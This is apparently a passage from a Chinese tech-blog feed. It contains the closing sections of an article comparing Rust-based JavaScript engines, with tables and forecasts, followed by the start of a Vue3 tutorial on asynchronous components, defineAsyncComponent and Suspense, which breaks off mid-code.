<table><thead><tr><th>特性</th><th>Rust 实现 (如 Boa)</th><th>C++ 实现 (如 V8)</th><th>C 实现 (如 QuickJS)</th></tr></thead><tbody><tr><td>内存安全</td><td>编译时检查，几乎无内存错误</td><td>依赖手动内存管理，存在潜在风险</td><td>有限的内存安全保证</td></tr><tr><td>性能</td><td>良好，但尚未完全优化</td><td>优异，高度优化</td><td>轻量级但性能相对较弱</td></tr><tr><td>生态系统</td><td>新兴，正在发展</td><td>成熟，工具丰富</td><td>稳定但扩展有限</td></tr><tr><td>学习曲线</td><td>陡峭</td><td>较陡</td><td>中等</td></tr><tr><td>内存占用</td><td>低</td><td>中高</td><td>极低</td></tr><tr><td>线程安全</td><td>内置保证</td><td>需额外机制</td><td>有限支持</td></tr></tbody></table>
<h3 data-id="heading-23">5.2 主要 Rust JS 引擎项目对比</h3>





























































<table><thead><tr><th>引擎/项目</th><th>类型</th><th>技术特点</th><th>使用案例</th><th>评分 (5分制)</th></tr></thead><tbody><tr><td>Boa</td><td>完整引擎</td><td>纯 Rust实现，代码库6.1K Stars，编译后体积约1MB，ES5完整支持，ES6+兼容性85%</td><td>嵌入式项目脚本扩展，教育工具</td><td>3.5</td></tr><tr><td>Yavashark</td><td>完整引擎</td><td>纯 Rust实现，1225 Stars，编译后5.6MB，启动&lt;10ms，ES2023完整支持，ES2025兼容性98%</td><td>嵌入式设备，边缘计算，WebAssembly运行时</td><td>4.0</td></tr><tr><td>Nova</td><td>完整引擎</td><td>纯 Rust实现，分层架构，热点路径比同类快15-20%，内存比Boa低30%，启动&lt;5ms</td><td>实时应用脚本引擎，桌面应用插件系统</td><td>3.8</td></tr><tr><td>Brimstone</td><td>完整引擎</td><td>纯 Rust实现，基础JIT编译，热点路径比纯解释器快2-3倍，支持SIMD指令集</td><td>科学计算，游戏引擎脚本系统，WASM互操作层</td><td>4.2</td></tr><tr><td>Mozjs</td><td>绑定库</td><td>SpiderMonkey的Rust绑定，约200个Rust结构体和特征，ES2023完整支持</td><td>Firefox组件，需要完整JS支持的桌面应用</td><td>4.5</td></tr><tr><td>Jsparagus</td><td>解析器</td><td>纯 Rust实现，基于PEG生成器，解析比传统快10-15%，代码覆盖率&gt;95%</td><td>Firefox解析器组件，开发工具，IDE代码分析</td><td>4.3</td></tr><tr><td>Rustyscript</td><td>执行环境</td><td>轻量级JS执行环境，简化API</td><td>简单脚本执行需求</td><td>3.0</td></tr></tbody></table>
<h3 data-id="heading-24">5.3 内存占用与启动性能对比</h3>



































<table><thead><tr><th>引擎类型</th><th>典型内存占用</th><th>启动时间</th><th>适用环境</th></tr></thead><tbody><tr><td>Rust 轻量引擎</td><td>&lt; 10MB</td><td>毫秒级</td><td>嵌入式设备、微控制器</td></tr><tr><td>Rust 完整引擎</td><td>10-50MB</td><td>亚秒级</td><td>桌面应用、服务端</td></tr><tr><td>C++ 主流引擎</td><td>50-200MB</td><td>秒级</td><td>浏览器、Node.js</td></tr><tr><td>C 轻量引擎</td><td>&lt; 5MB</td><td>微秒级</td><td>极资源受限环境</td></tr></tbody></table>
<h2 data-id="heading-25">六、JS 引擎发展趋势与 Rust 的未来角色</h2>
<h3 data-id="heading-26">6.1 安全性优先的设计理念</h3>
<p>随着网络安全威胁的日益复杂，JavaScript 引擎的安全性将成为首要考量。根据行业趋势，我们可以预见：</p>
<ul>
<li><strong>内存安全漏洞减少</strong>：如华为的实践所示，将核心组件 Rust 化可减少高达 67% 的内存安全漏洞 1，这一数据将推动更多引擎开发者采用 Rust</li>
<li><strong>形式化验证增加</strong>：Rust 的类型系统为形式化验证提供了基础，未来可能会看到更多经过形式化验证的 JS 引擎组件</li>
<li><strong>零信任架构融合</strong>：JavaScript 引擎将更深入地融入零信任安全架构，Rust 的不可变性和所有权特性使其成为实现这一目标的理想语言</li>
</ul>
<h3 data-id="heading-27">6.2 多样化部署环境的适应</h3>
<p>JavaScript 引擎正从浏览器和服务器扩展到更广泛的领域：</p>
<ul>
<li><strong>嵌入式与物联网</strong>：Rust 实现的轻量级 JS 引擎将成为 IoT 设备的理想选择，支持在资源受限环境中运行 JS 代码</li>
<li><strong>边缘计算节点</strong>：在 5G/6G 网络推动下，边缘节点需要高效执行 JS 代码，Rust 引擎可提供低延迟、高吞吐量的解决方案</li>
<li><strong>智能汽车与工业系统</strong>：这些对安全性和实时性要求极高的领域，将从 Rust 实现的 JS 引擎中获益良多</li>
</ul>
<h3 data-id="heading-28">6.3 WebAssembly 与 JavaScript 的深度融合</h3>
<p>WebAssembly 的普及正在改变 JavaScript 引擎的架构设计：</p>
<ul>
<li><strong>统一执行模型</strong>：未来 JS 引擎可能采用更统一的执行模型，无缝切换 JavaScript 和 WebAssembly 代码</li>
<li><strong>混合优化策略</strong>：Rust 作为 WebAssembly 的主要开发语言，将在优化混合执行环境方面发挥关键作用</li>
<li><strong>共享内存与协作</strong>：JavaScript 和 WebAssembly 模块之间的内存共享和协作将更加高效，Rust 的安全并发特性将促进这一发展</li>
</ul>
<h3 data-id="heading-29">6.4 云原生与服务器端应用</h3>
<p>JavaScript 在服务器端的应用正在扩展，Rust 实现的引擎将在以下方面提供价值：</p>
<ul>
<li><strong>微服务架构</strong>：轻量级 Rust JS 引擎适合构建高效的微服务，减少资源占用</li>
<li><strong>无服务器计算</strong>：更快的启动时间和更低的内存占用，使 Rust JS 引擎成为 FaaS 场景的理想选择</li>
<li><strong>实时数据处理</strong>：利用 Rust 的性能优势，处理高吞吐量的实时数据流</li>
</ul>
<h3 data-id="heading-30">6.5 生态系统整合与标准演进</h3>
<p>Rust 与 JavaScript 生态系统的整合将加深：</p>
<ul>
<li><strong>工具链共享</strong>：更多构建工具、调试器和性能分析工具将同时支持 Rust 和 JavaScript</li>
<li><strong>标准库互操作</strong>：JavaScript 标准库可能会借鉴 Rust 的某些设计理念，如更严格的类型检查</li>
<li><strong>跨语言框架</strong>：更多框架将支持 Rust 和 JavaScript 的无缝协作，如 Tauri 等桌面应用框架</li>
</ul>
<h3 data-id="heading-31">6.6 量化的未来展望：2025-2030</h3>
<p>基于当前技术发展趋势，我们可以对 Rust 在 JS 引擎领域的未来做出以下预测：</p>
<ul>
<li><strong>2025 年</strong>：至少有一个主流浏览器引擎将有 20% 以上的组件使用 Rust 实现</li>
<li><strong>2026 年</strong>：首个完全使用 Rust 实现的生产级 JS 引擎将问世</li>
<li><strong>2028 年</strong>：Rust 实现的 JS 引擎在嵌入式和边缘计算领域的市场份额将超过 30%</li>
<li><strong>2030 年</strong>：JavaScript 引擎的安全漏洞将比 2023 年减少 50%，主要归功于 Rust 等内存安全语言的采用</li>
</ul>
<h2 data-id="heading-32">七、结论</h2>
<p>Rust 在 JavaScript 引擎赛道中正在扮演越来越重要的角色。从纯 Rust 实现的 Boa 引擎，到 Mozilla 的 Jsparagus 解析器，再到与现有 C++ 引擎的集成方案，Rust 正在为 JavaScript 引擎带来新的技术可能性。</p>
<p>随着 Rust 生态系统的不断成熟和性能优化工作的持续推进，我们有理由相信，未来将会看到更多性能卓越、安全可靠的 JavaScript 引擎采用 Rust 实现或部分组件 Rust 化。对于开发者而言，了解 Rust 在 JavaScript 引擎中的应用，不仅有助于选择合适的技术栈，也能更好地理解现代 Web 技术的发展方向。</p>
<p>在这个性能与安全并重的时代，Rust 正在为 JavaScript 引擎的发展开辟一条新的道路，而这条道路，值得我们持续关注和探索。</p>
<hr/>
 <p/>
<table>
    <tbody><tr>
        <td>
            <img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f67cd30497a34f66ae5547c02192f59b~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=1300&amp;h=1820&amp;s=574996&amp;e=jpg&amp;b=81dd6b" width="150" loading="lazy"/>
        </td>
        <td> 
<p>更多 JavaScript 基础知识的学习，可以学习我写的这本 <a href="https://juejin.cn/book/7226969813581889575" target="_blank" title="https://juejin.cn/book/7226969813581889575">《JavaScript 语言编程进阶》</a>  小册。 </p></td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3 异步组件深度解析：提升大型应用性能与用户体验的完整指南]]></title>    <link>https://juejin.cn/post/7575320672572194858</link>    <guid>https://juejin.cn/post/7575320672572194858</guid>    <pubDate>2025-11-23T03:12:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575320672572194858" data-draft-id="7575159361904377897" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3 异步组件深度解析：提升大型应用性能与用户体验的完整指南"/> <meta itemprop="keywords" content="前端,Vue.js"/> <meta itemprop="datePublished" content="2025-11-23T03:12:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="北辰alk"/> <meta itemprop="url" content="https://juejin.cn/user/1772855673241352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3 异步组件深度解析：提升大型应用性能与用户体验的完整指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1772855673241352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    北辰alk
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T03:12:37.000Z" title="Sun Nov 23 2025 03:12:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Vue3 异步组件深度解析：提升大型应用性能与用户体验的完整指南</strong></h2>
<h3 data-id="heading-1"><strong>摘要</strong></h3>
<p>在大型 Vue.js 应用中，组件异步加载是优化性能、提升用户体验的关键技术。Vue3 提供了全新且更强大的异步组件机制，支持 <code>defineAsyncComponent</code>、组合式 API 与 Suspense 配合等现代化方案。本文将深入探讨 Vue3 中异步组件的各种实现方式，通过详细的代码示例、执行流程分析和最佳实践，帮助你彻底掌握这一重要特性。</p>
<hr/>
<h3 data-id="heading-2"><strong>一、 为什么需要异步组件？</strong></h3>
<h4 data-id="heading-3"><strong>1.1 性能瓶颈与解决方案</strong></h4>
<p>在传统单页面应用（SPA）中，所有组件通常被打包到一个 JavaScript 文件中，导致：</p>
<ul>
<li><strong>首屏加载缓慢</strong>：用户需要等待整个应用下载完成才能看到内容</li>
<li><strong>资源浪费</strong>：用户可能永远不会访问某些页面，但依然加载了对应的代码</li>
<li><strong>用户体验差</strong>：特别是对于移动端用户和网络条件较差的场景</li>
</ul>
<p><strong>异步组件</strong>通过代码分割（Code Splitting）解决了这些问题：</p>
<ul>
<li><strong>按需加载</strong>：只在需要时加载组件代码</li>
<li><strong>减小初始包体积</strong>：显著降低首屏加载时间</li>
<li><strong>优化缓存</strong>：独立 chunk 可以更好地利用浏览器缓存</li>
</ul>
<h4 data-id="heading-4"><strong>1.2 Vue3 异步组件的新特性</strong></h4>
<p>Vue3 在异步组件方面进行了重要改进：</p>
<ul>
<li><strong>更简洁的 API</strong>：<code>defineAsyncComponent</code> 替代 Vue2 的复杂配置</li>
<li><strong>更好的 TypeScript 支持</strong>：完整的类型推断</li>
<li><strong>与 Suspense 集成</strong>：更优雅的加载状态处理</li>
<li><strong>组合式 API 配合</strong>：更灵活的异步逻辑组织</li>
</ul>
<hr/>
<h3 data-id="heading-5"><strong>二、 基础异步组件加载</strong></h3>
<h4 data-id="heading-6"><strong>2.1 使用 <code>defineAsyncComponent</code></strong></h4>
<p>Vue3 引入了 <code>defineAsyncComponent</code> 函数来创建异步组件，这是最基础的用法。</p>
<p><strong>流程图：基础异步组件加载流程</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[父组件渲染] --&gt; B{遇到异步组件}
    B --&gt; C[显示Loading占位]
    C --&gt; D[开始加载组件]
    D --&gt; E{加载成功?}
    E -- 是 --&gt; F[渲染异步组件]
    E -- 否 --&gt; G[显示Error组件]
    F --&gt; H[组件完全激活]
</code></pre>
<p><strong>代码示例：基础用法</strong></p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="app"&gt;
    &lt;h2&gt;异步组件基础示例&lt;/h2&gt;
    &lt;button @click="showAsyncComponent = true"&gt;加载异步组件&lt;/button&gt;
    
    &lt;div v-if="showAsyncComponent"&gt;
      &lt;!-- 异步组件在这里渲染 --&gt;
      &lt;AsyncUserProfile /&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { defineAsyncComponent, ref } from 'vue'

// 基础异步组件定义
const AsyncUserProfile = defineAsyncComponent(() =&gt;
  import('./components/UserProfile.vue')
)

const showAsyncComponent = ref(false)
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-7"><strong>2.2 模拟异步组件内容</strong></h4>
<p><strong>UserProfile.vue</strong>（被异步加载的组件）：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="user-profile" style="border: 2px solid #42b983; padding: 20px; margin: 10px 0;"&gt;
    &lt;h3&gt;用户信息组件 (异步加载)&lt;/h3&gt;
    &lt;div&gt;姓名: 张三&lt;/div&gt;
    &lt;div&gt;邮箱: zhangsan@example.com&lt;/div&gt;
    &lt;div&gt;角色: 管理员&lt;/div&gt;
    &lt;div&gt;组件加载时间: {{ new Date().toLocaleTimeString() }}&lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { onMounted, onUnmounted } from 'vue'

console.log('UserProfile 组件被加载了')

onMounted(() =&gt; {
  console.log('UserProfile 组件挂载完成')
})

onUnmounted(() =&gt; {
  console.log('UserProfile 组件已卸载')
})
&lt;/script&gt;
</code></pre>
<hr/>
<h3 data-id="heading-8"><strong>三、 高级配置：加载与错误处理</strong></h3>
<p>在实际应用中，我们需要处理加载状态和错误情况，提供更好的用户体验。</p>
<h4 data-id="heading-9"><strong>3.1 完整的配置选项</strong></h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="app"&gt;
    &lt;h2&gt;高级异步组件示例&lt;/h2&gt;
    
    &lt;!-- 加载状态控制按钮 --&gt;
    &lt;div style="margin-bottom: 20px;"&gt;
      &lt;button @click="loadComponent"&gt;加载高级组件&lt;/button&gt;
      &lt;button @click="unloadComponent" style="margin-left: 10px;"&gt;卸载组件&lt;/button&gt;
    &lt;/div&gt;
    
    &lt;!-- 异步组件渲染区域 --&gt;
    &lt;AdvancedAsyncComponent 
      v-if="showAdvancedComponent" 
      :user-id="currentUserId" 
    /&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { defineAsyncComponent, ref } from 'vue'

// 模拟网络延迟
const delay = (ms) =&gt; new Promise(resolve =&gt; setTimeout(resolve, ms))

// 加载状态
const isLoading = ref(false)
const loadError = ref(null)

// 完整配置的异步组件
const AdvancedAsyncComponent = defineAsyncComponent({
  // 加载器函数
  loader: async () =&gt; {
    console.log('开始加载高级组件...')
    isLoading.value = true
    loadError.value = null
    
    try {
      // 模拟网络延迟
      await delay(2000)
      
      // 动态导入组件
      const component = await import('./components/AdvancedFeatures.vue')
      console.log('高级组件加载成功')
      return component
    } catch (error) {
      console.error('组件加载失败:', error)
      loadError.value = error
      throw error
    } finally {
      isLoading.value = false
    }
  },
  
  // 加载中显示的组件
  loadingComponent: {
    template: `
      &lt;div class="loading-container" style="padding: 40px; text-align: center; border: 2px dashed #ccc;"&gt;
        &lt;div class="spinner" style="width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #42b983; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"&gt;&lt;/div&gt;
        &lt;p style="margin-top: 16px; color: #666;"&gt;组件加载中，请稍候...&lt;/p&gt;
        &lt;p style="font-size: 12px; color: #999;"&gt;这通常需要 2-3 秒&lt;/p&gt;
      &lt;/div&gt;
    `
  },
  
  // 加载失败显示的组件
  errorComponent: {
    props: ['error'],
    template: `
      &lt;div class="error-container" style="padding: 40px; text-align: center; border: 2px solid #f56c6c; background: #fef0f0;"&gt;
        &lt;div style="font-size: 48px; color: #f56c6c;"&gt;❌&lt;/div&gt;
        &lt;h3 style="color: #f56c6c;"&gt;组件加载失败&lt;/h3&gt;
        &lt;p style="color: #666;"&gt;抱歉，无法加载请求的组件&lt;/p&gt;
        &lt;p style="font-size: 12px; color: #999; margin-top: 10px;"&gt;错误信息: {{ error.message }}&lt;/p&gt;
        &lt;button @click="$emit('retry')" style="margin-top: 16px; padding: 8px 16px; background: #42b983; color: white; border: none; border-radius: 4px;"&gt;重试加载&lt;/button&gt;
      &lt;/div&gt;
    `,
    emits: ['retry']
  },
  
  // 延迟显示加载状态（避免闪烁）
  delay: 200,
  
  // 超时时间（毫秒）
  timeout: 5000,
  
  // 是否可挂起（Suspense 相关）
  suspensible: false
})

// 组件状态控制
const showAdvancedComponent = ref(false)
const currentUserId = ref('12345')

const loadComponent = () =&gt; {
  showAdvancedComponent.value = true
}

const unloadComponent = () =&gt; {
  showAdvancedComponent.value = false
}
&lt;/script&gt;

&lt;style&gt;
@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
&lt;/style&gt;
</code></pre>
<h4 data-id="heading-10"><strong>3.2 高级功能组件示例</strong></h4>
<p><strong>AdvancedFeatures.vue</strong>：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="advanced-features" style="border: 2px solid #e6a23c; padding: 20px; margin: 10px 0; background: #fdf6ec;"&gt;
    &lt;h3&gt;高级功能组件 (异步加载)&lt;/h3&gt;
    &lt;p&gt;组件ID: {{ props.userId }}&lt;/p&gt;
    
    &lt;div class="features"&gt;
      &lt;div v-for="feature in features" :key="feature.id" class="feature-item"&gt;
        &lt;strong&gt;{{ feature.name }}&lt;/strong&gt;: {{ feature.description }}
      &lt;/div&gt;
    &lt;/div&gt;
    
    &lt;div style="margin-top: 20px;"&gt;
      &lt;button @click="simulateAction" style="padding: 8px 16px; background: #e6a23c; color: white; border: none; border-radius: 4px;"&gt;模拟操作&lt;/button&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref, onMounted } from 'vue'

const props = defineProps({
  userId: {
    type: String,
    required: true
  }
})

const features = ref([
  { id: 1, name: '数据分析', description: '实时数据可视化分析' },
  { id: 2, name: '报表生成', description: '自动生成详细业务报表' },
  { id: 3, name: '权限管理', description: '细粒度的权限控制系统' }
])

const simulateAction = () =&gt; {
  console.log('执行高级操作，用户ID:', props.userId)
}

onMounted(() =&gt; {
  console.log('高级功能组件已挂载，用户ID:', props.userId)
})
&lt;/script&gt;

&lt;style scoped&gt;
.feature-item {
  padding: 8px;
  margin: 4px 0;
  background: white;
  border-radius: 4px;
}
&lt;/style&gt;
</code></pre>
<hr/>
<h3 data-id="heading-11"><strong>四、 结合 Suspense 的现代方案</strong></h3>
<p>Vue3 的 <code>&lt;Suspense&gt;</code> 组件提供了更声明式的异步处理方式。</p>
<h4 data-id="heading-12"><strong>4.1 Suspense 基础用法</strong></h4>
<p><strong>流程图：Suspense 异步加载流程</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[Suspense组件] --&gt; B[渲染default插槽]
    B --&gt; C{异步依赖&lt;br&gt;是否解析?}
    C -- 否 --&gt; D[显示fallback内容]
    C -- 是 --&gt; E[显示异步内容]
    D --&gt; F[异步依赖解析完成]
    F --&gt; E
    E --&gt; G[可触发resolved事件]
</code></pre>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="app"&gt;
    &lt;h2&gt;Suspense 异步组件示例&lt;/h2&gt;
    
    &lt;Suspense&gt;
      &lt;!-- 主要内容 --&gt;
      &lt;template #default&gt;
        &lt;SuspenseUserDashboard :user-id="userId" /&gt;
      &lt;/template&gt;
      
      &lt;!-- 加载状态 --&gt;
      &lt;template #fallback&gt;
        &lt;div class="suspense-loading" style="padding: 60px; text-align: center;"&gt;
          &lt;div class="loading-indicator" style="display: inline-block;"&gt;
            &lt;div style="display: flex; align-items: center; gap: 12px;"&gt;
              &lt;div class="spinner" style="width: 32px; height: 32px; border: 3px solid #e0e0e0; border-top: 3px solid #42b983; border-radius: 50%; animation: spin 1s linear infinite;"&gt;&lt;/div&gt;
              &lt;div&gt;
                &lt;p style="margin: 0; font-weight: bold;"&gt;仪表板加载中&lt;/p&gt;
                &lt;p style="margin: 4px 0 0 0; font-size: 12px; color: #666;"&gt;正在准备您的数据...&lt;/p&gt;
              &lt;/div&gt;
            &lt;/div&gt;
          &lt;/div&gt;
        &lt;/div&gt;
      &lt;/template&gt;
    &lt;/Suspense&gt;
    
    &lt;button @click="reloadDashboard" style="margin-top: 20px;"&gt;重新加载&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref } from 'vue'

// 异步组件（注意：需要设置 suspensible: true）
const SuspenseUserDashboard = defineAsyncComponent(() =&gt;
  import('./components/UserDashboard.vue')
)

const userId = ref('user-001')

const reloadDashboard = () =&gt; {
  // 通过改变 key 强制重新加载组件
  userId.value = 'user-' + Date.now()
}
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-13"><strong>4.2 支持异步设置的组件</strong></h4>
<p><strong>UserDashboard.vue</strong>：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="user-dashboard" style="border: 2px solid #409eff; padding: 20px; margin: 10px 0; background: #ecf5ff;"&gt;
    &lt;h3&gt;用户仪表板 (Suspense 加载)&lt;/h3&gt;
    
    &lt;!-- 用户信息 --&gt;
    &lt;div class="user-info" style="margin-bottom: 20px;"&gt;
      &lt;h4&gt;用户信息&lt;/h4&gt;
      &lt;div v-if="userData"&gt;姓名: {{ userData.name }}&lt;/div&gt;
      &lt;div v-if="userData"&gt;等级: {{ userData.level }}&lt;/div&gt;
    &lt;/div&gt;
    
    &lt;!-- 统计卡片 --&gt;
    &lt;div class="stats" style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; margin-bottom: 20px;"&gt;
      &lt;div v-for="stat in stats" :key="stat.name" class="stat-card" style="padding: 16px; background: white; border-radius: 8px; text-align: center;"&gt;
        &lt;div style="font-size: 24px; font-weight: bold; color: #409eff;"&gt;{{ stat.value }}&lt;/div&gt;
        &lt;div style="font-size: 12px; color: #666;"&gt;{{ stat.name }}&lt;/div&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    
    &lt;!-- 最近活动 --&gt;
    &lt;div class="recent-activity"&gt;
      &lt;h4&gt;最近活动&lt;/h4&gt;
      &lt;ul&gt;
        &lt;li v-for="activity in activities" :key="activity.id" style="margin: 8px 0;"&gt;
          {{ activity.action }} - {{ activity.time }}
        &lt;/li&gt;
      &lt;/ul&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref, onMounted } from 'vue'

const props = defineProps({
  userId: {
    type: String,
    required: true
  }
})

// 模拟异步数据获取
const userData = ref(null)
const stats = ref([])
const activities = ref([])

// 模拟 API 调用
const fetchUserData = () =&gt; {
  return new Promise(resolve =&gt; {
    setTimeout(() =&gt; {
      resolve({
        name: '李四',
        level: 'VIP',
        joinDate: '2023-01-15'
      })
    }, 1500)
  })
}

const fetchStats = () =&gt; {
  return new Promise(resolve =&gt; {
    setTimeout(() =&gt; {
      resolve([
        { name: '项目数量', value: 24 },
        { name: '完成任务', value: 89 },
        { name: '团队排名', value: '前 5%' }
      ])
    }, 1000)
  })
}

const fetchActivities = () =&gt; {
  return new Promise(resolve =&gt; {
    setTimeout(() =&gt; {
      resolve([
        { id: 1, action: '创建了新项目', time: '2小时前' },
        { id: 2, action: '完成了任务', time: '5小时前' },
        { id: 3, action: '加入了团队', time: '1天前' }
      ])
    }, 800)
  })
}

